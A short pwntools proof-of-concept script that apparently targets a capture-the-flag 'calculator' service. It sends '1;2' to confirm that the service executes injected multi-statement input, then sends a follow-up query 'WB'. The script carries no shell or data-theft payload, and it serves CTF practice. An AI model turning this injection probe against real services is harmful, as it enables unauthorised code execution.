#!/usr/bin/env python3
from pathlib import Path
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
HOST = args.HOST or "chal.thjcc.org"
PORT = int(args.PORT or 9006)
context.log_level = args.LOG_LEVEL or "info"


def start():
    if args.REMOTE or not args.LOCAL:
        return remote(HOST, PORT, timeout=3)
    log.error("No local binary was supplied in the challenge directory")


def query(io, line):
    io.sendline(line.encode())
    out = io.recvuntil(b"calc> ", timeout=3)
    return out[:-len(b"calc> ")]


def main():
    io = start()
    io.recvuntil(b"calc> ")
    # Confirm the vulnerability: the service executes a statement suite,
    # although it presents the input as a calculator expression.
    proof = query(io, "1;2")
    if proof.strip() != b"2":
        log.error("exec primitive was not reproduced: %r", proof)
    log.info("confirmed multi-statement execution: %r", proof.strip())
    log.info("WB: %s", query(io, "WB").decode(errors="replace").strip())
    io.close()


if __name__ == "__main__":
    main()
